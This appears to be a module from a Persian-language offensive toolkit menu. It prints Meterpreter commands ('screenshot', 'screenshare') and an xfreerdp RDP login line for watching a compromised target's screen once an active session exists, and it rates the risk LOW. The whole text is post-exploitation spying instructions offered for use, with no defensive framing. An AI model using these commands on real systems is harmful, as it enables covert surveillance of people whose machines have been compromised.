DESC="دیدن صفحه‌ی هدف (اسکرین‌شات و استریم)"
REQ="session فعال"
RISK="LOW"

termux(){ echo "# داخل meterpreter: screenshot"; }

kali(){
cat <<'EOF'
# داخل meterpreter:
screenshot
screenshare -i 1
# یا بدون meterpreter، با RDP:
xfreerdp /v:<IP> /u:<user> /p:<pass> /dynamic-resolution
EOF
}
